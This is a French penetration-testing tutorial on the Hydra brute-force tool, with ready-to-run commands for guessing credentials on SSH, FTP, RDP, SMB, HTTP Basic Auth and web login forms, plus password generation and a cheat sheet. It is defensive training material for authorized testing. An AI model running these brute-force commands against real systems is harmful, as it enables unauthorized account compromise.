# Hydra

## Pourquoi

Hydra est l'outil de brute force reseau le plus utilise en pentest. Rapide, parallele et capable de cibler des dizaines de protocoles differents, il permet de tester methodiquement la robustesse des authentifications sur quasiment tous les services rencontres en engagement.

## Comment ca marche

Hydra ouvre plusieurs connexions simultanees vers le service cible et teste les combinaisons login/mot de passe en parallele. Chaque protocole a son propre module qui sait comment envoyer les credentials et interpreter la reponse du serveur (succes, echec, erreur).

## En pratique

### Installation

Hydra est preinstalle sur la plupart des distributions de pentest (Kali, Parrot, Exegol). Pour verifier :

```bash
hydra -h
```

Si absent :

```bash
sudo apt-get update && sudo apt-get install -y hydra
```

### Syntaxe generale

```bash
hydra [options_login] [options_password] [options_attaque] [cible] [service]
```

### Options principales

| Option | Description | Exemple |
|---|---|---|
| `-l LOGIN` | Un seul login | `hydra -l admin ...` |
| `-L FILE` | Fichier de logins | `hydra -L users.txt ...` |
| `-p PASS` | Un seul mot de passe | `hydra -p secret ...` |
| `-P FILE` | Fichier de mots de passe | `hydra -P passwords.txt ...` |
| `-t TASKS` | Nombre de threads paralleles | `hydra -t 4 ...` |
| `-f` | Stopper au premier succes | `hydra -f ...` |
| `-s PORT` | Port non standard | `hydra -s 2222 ...` |
| `-v` / `-V` | Mode verbeux / tres verbeux | `hydra -V ...` |

### Services supportes

| Service | Protocole | Exemple |
|---|---|---|
| `ssh` | SSH | `hydra -l root -P pass.txt ssh://<IP_CIBLE>` |
| `ftp` | FTP | `hydra -l admin -P pass.txt ftp://<IP_CIBLE>` |
| `http-get` | Basic Auth HTTP | `hydra -L users.txt -P pass.txt <IP_CIBLE> http-get /` |
| `http-post-form` | Formulaire POST | `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` |
| `rdp` | Remote Desktop | `hydra -l admin -P pass.txt rdp://<IP_CIBLE>` |
| `mysql` | MySQL | `hydra -l root -P pass.txt mysql://<IP_CIBLE>` |
| `smb` | SMB | `hydra -l admin -P pass.txt smb://<IP_CIBLE>` |
| `smtp` | SMTP | `hydra -l admin -P pass.txt smtp://<IP_CIBLE>` |
| `vnc` | VNC | `hydra -P pass.txt vnc://<IP_CIBLE>` |

### Brute force d'une Basic Auth HTTP

L'authentification HTTP Basic envoie les credentials encodes en Base64 dans le header `Authorization`. Hydra utilise le module `http-get` pour tester les combinaisons :

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      -f <IP_CIBLE> -s <PORT> http-get /
```

Le `-f` arrete l'attaque des qu'un couple valide est trouve. Le resultat affiche le login et le mot de passe decouverts :

```
[PORT][http-get] host: <IP_CIBLE>   login: user   password: pass
[STATUS] attack finished (valid pair found)
```

### Brute force d'un formulaire de login (http-post-form)

Les formulaires web sont plus courants que la Basic Auth. Hydra a besoin de trois informations pour les cibler :

1. Le chemin du formulaire
2. Les parametres POST avec les marqueurs `^USER^` et `^PASS^`
3. Une condition d'echec (`F=`) ou de succes (`S=`)

#### Identifier les parametres du formulaire

Avant de lancer Hydra, inspecter le formulaire :

{% tabs %}
{% tab title="Inspecteur HTML" %}
Clic droit sur le formulaire, "Inspecter". Identifier les attributs `name` des champs input :

```html
<form method="POST" action="/login">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

Les informations cles : methode `POST`, action `/login`, champs `username` et `password`.
{% endtab %}

{% tab title="DevTools Network" %}
Soumettre un login invalide, puis dans l'onglet Network (F12), trouver la requete POST. Le body contient les parametres exacts :

```
username=test&password=test
```

La reponse contient le message d'erreur a utiliser comme condition d'echec.
{% endtab %}

{% tab title="Proxy (Burp/ZAP)" %}
Intercepter la requete de login avec un proxy. On obtient la structure complete de la requete, incluant les parametres, headers et cookies eventuels.
{% endtab %}
{% endtabs %}

#### Construire la commande Hydra

Une fois les parametres identifies :

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      -f <IP_CIBLE> -s <PORT> \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

La chaine de parametres se decompose en trois parties separees par `:` :

- `/` - le chemin du formulaire
- `username=^USER^&password=^PASS^` - les parametres POST avec les marqueurs
- `F=Invalid credentials` - la condition d'echec (texte present dans la reponse en cas de login invalide)

#### Condition de succes vs echec

| Condition | Syntaxe | Quand l'utiliser |
|---|---|---|
| Echec (`F=`) | `F=Invalid credentials` | Message d'erreur visible dans la reponse (cas le plus courant) |
| Succes (`S=`) | `S=302` | Redirection apres login reussi |
| Succes (`S=`) | `S=Dashboard` | Texte specifique present uniquement apres login reussi |

{% hint style="info" %}
La condition d'echec (`F=`) est generalement plus fiable. Les messages d'erreur sont visibles et faciles a identifier. La condition de succes (`S=`) est utile quand le message d'erreur varie ou n'est pas explicite.
{% endhint %}

### Exemples avances

#### Cibler plusieurs serveurs SSH

```bash
hydra -l root -p toor -M targets.txt ssh
```

Le fichier `targets.txt` contient une IP par ligne. Hydra teste chaque serveur en parallele.

#### FTP sur un port non standard

```bash
hydra -L users.txt -P passwords.txt -s 2121 -V ftp://<IP_CIBLE>
```

#### Generation de mots de passe a la volee

```bash
hydra -l administrator \
      -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
      rdp://<IP_CIBLE>
```

L'option `-x min:max:charset` genere toutes les combinaisons possibles du charset donne, avec une longueur entre `min` et `max` caracteres.

## Pieges et galeres

- Le nombre de threads (`-t`) par defaut est 16. Pour SSH, le reduire a 4 pour eviter les deconnexions. Pour HTTP, on peut monter a 32 ou plus.
- Les formulaires avec des tokens CSRF changent a chaque requete. Hydra ne gere pas nativement les tokens CSRF. Utiliser Burp Intruder ou un script Python dans ce cas.
- Si Hydra rapporte `[ERROR] Could not connect to target`, verifier le port, le protocole et la connectivite reseau avant de relancer.
- Le module `http-post-form` attend exactement le format `chemin:params:condition`. Un `:` supplementaire dans l'URL ou le message casse le parsing.
- Certains services imposent un delai entre les tentatives. Ajouter `-W <secondes>` pour espacer les requetes.

## Retour terrain

Hydra est l'outil de reference pour le brute force en pentest. Sa force est sa polyvalence : un seul outil pour SSH, FTP, HTTP, RDP, bases de donnees, etc. En engagement, on l'utilise principalement sur les services web (Basic Auth et formulaires) et les acces distants (SSH, RDP).

Pour les formulaires complexes (CSRF, JavaScript, multi-etapes), Hydra atteint ses limites. Dans ces cas, un script Python avec `requests` ou Burp Intruder sont des alternatives plus flexibles.

## Memo express

| Objectif | Commande |
|---|---|
| Basic Auth HTTP | `hydra -L users.txt -P pass.txt -f <IP> http-get /` |
| Formulaire POST | `hydra -L users.txt -P pass.txt <IP> http-post-form "/path:user=^USER^&pass=^PASS^:F=Error"` |
| SSH | `hydra -l root -P pass.txt ssh://<IP>` |
| FTP port custom | `hydra -L users.txt -P pass.txt -s 2121 ftp://<IP>` |
| Stopper au 1er succes | Ajouter `-f` |
| Reduire les threads | `-t 4` (recommande pour SSH) |
| Generer les passwords | `-x 6:8:charset` |

***
